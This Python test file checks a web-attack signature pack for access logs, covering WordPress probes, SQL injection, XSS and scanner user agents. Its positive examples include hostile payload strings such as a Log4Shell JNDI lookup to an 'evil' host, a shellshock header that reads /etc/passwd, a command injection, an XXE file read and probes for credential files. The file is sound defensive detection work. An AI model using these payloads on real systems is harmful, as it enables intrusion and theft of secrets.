"""Part 2: the web-attack signature pack (webapp/api/signatures_web.yaml).

Each signature matches a realistic access-log example and the right one wins;
normal traffic (home page, successful login, static assets, legit REST reads)
and the WordPress start-up fixture match no attack signature.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from webapp.api.signatures import SignatureKB, load_rules  # noqa: E402

KB = SignatureKB(load_rules())


def _line(request, status=200, ua="Mozilla/5.0", ref="-", ip="203.0.113.9"):
    return f'{ip} - - [02/Nov/2026:10:00:00 +0000] "{request}" {status} 1234 "{ref}" "{ua}"'


# (expected signature id, example access-log line). The example must make the
# intended signature the first match.
POSITIVES = [
    ("wp-rest-content-injection", _line("POST /?rest_route=/wp/v2/posts/1&id=1abc HTTP/1.1")),
    ("wp-author-enumeration", _line("GET /?author=7 HTTP/1.1", status=404)),
    ("wp-rest-user-enumeration", _line("GET /wp-json/wp/v2/users HTTP/1.1")),
    ("wp-login-bruteforce", _line("POST /wp-login.php HTTP/1.1", status=200, ua="attack-probe/1.0")),
    ("wp-xmlrpc-abuse", _line("POST /xmlrpc.php HTTP/1.1")),
    ("wp-config-probe", _line("GET /wp-config.php.bak HTTP/1.1")),
    ("wp-uploads-php-webshell", _line("GET /wp-content/uploads/2024/08/shell.php HTTP/1.1")),
    ("wp-plugin-revslider", _line("GET /wp-content/plugins/revslider/temp/update_extract/x HTTP/1.1")),
    ("wp-plugin-file-manager", _line("POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1")),
    ("wp-admin-install-probe", _line("GET /wp-admin/install.php HTTP/1.1")),
    ("sqli-union-select", _line("GET /p?id=1 union select user,pass from users HTTP/1.1")),
    ("sqli-functions", _line("GET /p?id=1 and sleep(5) HTTP/1.1")),
    ("sqli-boolean", _line("GET /p?id=1'%20or%201=1-- HTTP/1.1")),
    ("xss-script-tag", _line("GET /s?q=<script>alert(1)</script> HTTP/1.1")),
    ("xss-event-handler", _line("GET /s?q=x%22%20onerror=alert(1) HTTP/1.1")),
    ("path-traversal-dotdot", _line("GET /download?f=../../../../etc/hosts HTTP/1.1")),
    ("lfi-sensitive-files", _line("GET /view?p=/proc/self/environ HTTP/1.1")),
    ("cmd-injection-shell", _line("GET /ping?host=x;id HTTP/1.1")),
    ("log4shell-jndi", _line("GET / HTTP/1.1", ua="${jndi:ldap://evil/a}")),
    ("dotenv-probe", _line("GET /.env HTTP/1.1")),
    ("git-dir-probe", _line("GET /.git/config HTTP/1.1")),
    ("cloud-cred-probe", _line("GET /.aws/credentials HTTP/1.1")),
    ("backup-archive-probe", _line("GET /backup.sql.gz HTTP/1.1")),
    ("phpinfo-probe", _line("GET /phpinfo.php HTTP/1.1")),
    ("webshell-common-names", _line("GET /wso.php HTTP/1.1")),
    ("scanner-ua-sqlmap", _line("GET /a HTTP/1.1", ua="sqlmap/1.7.2#stable")),
    ("scanner-ua-vuln-scanners", _line("GET /a HTTP/1.1", ua="Mozilla/5.00 (Nikto/2.1.6)")),
    ("scanner-ua-fuzzers", _line("GET /a HTTP/1.1", ua="gobuster/3.6")),
    ("scanner-ua-libraries", _line("GET /a HTTP/1.1", ua="python-urllib/3.11")),
    ("http-401-403-flood", _line("GET /secret HTTP/1.1", status=403)),
    ("http-suspicious-method", _line("TRACE / HTTP/1.1")),
    ("ssti-markers", _line("GET /s?q={{7*7}} HTTP/1.1")),
    ("crlf-injection", _line("GET /r?u=x%0d%0aSet-Cookie:evil=1 HTTP/1.1")),
    ("open-redirect", _line("GET /go?next=https://evil.example HTTP/1.1")),
    ("ssrf-internal-target", _line("GET /fetch?url=http://169.254.169.254/latest/meta-data HTTP/1.1")),
    ("shellshock", _line("GET / HTTP/1.1", ua="() { :; }; /bin/cat /etc/passwd")),
    ("struts-ognl", _line("GET /x?a=${#_memberAccess.setAllowed} HTTP/1.1")),
    ("php-wrapper-lfi", _line("GET /i?p=php://filter/convert.base64-encode/resource=index HTTP/1.1")),
    ("xxe-probe", _line("POST /api <!DOCTYPE foo [<!ENTITY x SYSTEM \"file:///etc/passwd\">] HTTP/1.1")),
    ("null-byte-injection", _line("GET /f?name=shell.php%00.jpg HTTP/1.1")),
    ("admin-panel-probe", _line("GET /phpmyadmin/ HTTP/1.1")),
]

# Normal traffic + the start-up fixture: must match NO web-attack signature
# (an operational signature like connection-refused is fine; it has no attack_type).
NEGATIVES = [
    _line("GET / HTTP/1.1", ua="Mozilla/5.0 (baseline)"),
    _line("POST /wp-login.php HTTP/1.1", status=302, ua="Mozilla/5.0"),   # successful login
    _line("GET /?p=12 HTTP/1.1", ua="Mozilla/5.0"),                       # a normal post
    _line("GET /about-us HTTP/1.1", ua="Mozilla/5.0"),
    _line("GET /wp-content/uploads/2024/08/photo.jpg HTTP/1.1"),          # static media
    _line("GET /wp-json/wp/v2/posts HTTP/1.1", ua="Mozilla/5.0"),         # legit REST read (not users)
    _line("GET /wp-content/themes/twentytwenty/style.css HTTP/1.1"),
    "MySQL Connection Error: (2002) Connection refused - retrying (3)",   # start-up, non-access
    "WordPress not found in /var/www/html - copying now... Complete!",
]


@pytest.mark.parametrize("expected_id,line", POSITIVES, ids=[p[0] for p in POSITIVES])
def test_signature_matches_its_example(expected_id, line):
    rule = KB.match_record({"message": line})
    assert rule is not None, f"no signature matched {expected_id} example"
    assert rule.id == expected_id, f"{line!r} matched {rule.id}, expected {expected_id}"
    assert rule.attack_type, f"{expected_id} should carry an attack_type"
    assert rule.confidence in ("low", "medium", "high")


def test_every_web_signature_has_a_positive_example():
    web_ids = {r.id for r in KB.rules if r.attack_type}
    covered = {expected for expected, _ in POSITIVES}
    assert web_ids == covered, f"uncovered web signatures: {sorted(web_ids - covered)}"


@pytest.mark.parametrize("line", NEGATIVES)
def test_normal_traffic_matches_no_attack_signature(line):
    rule = KB.match_record({"message": line})
    assert rule is None or not rule.attack_type, (
        f"{line!r} unexpectedly matched attack signature {rule.id!r}" if rule else "")


def test_wp_attack_replay_fixture_baseline_and_startup_clean():
    # The real replay fixture's baseline and start-up waves carry no attack type.
    fx = json.loads((ROOT / "test" / "fixtures" / "wp_attack_replay" / "waves.json").read_text())
    for spec in fx["specs"]:
        if spec["name"] not in ("idle_baseline", "startup_db_errors", "history_marker"):
            continue
        for i in range(min(spec["count"], 5)):
            msg = spec["message"].format(i=i, ip=(i % 250) + 1)
            rule = KB.match_record({"message": msg})
            assert rule is None or not rule.attack_type, f"{spec['name']} matched {rule.id!r}"
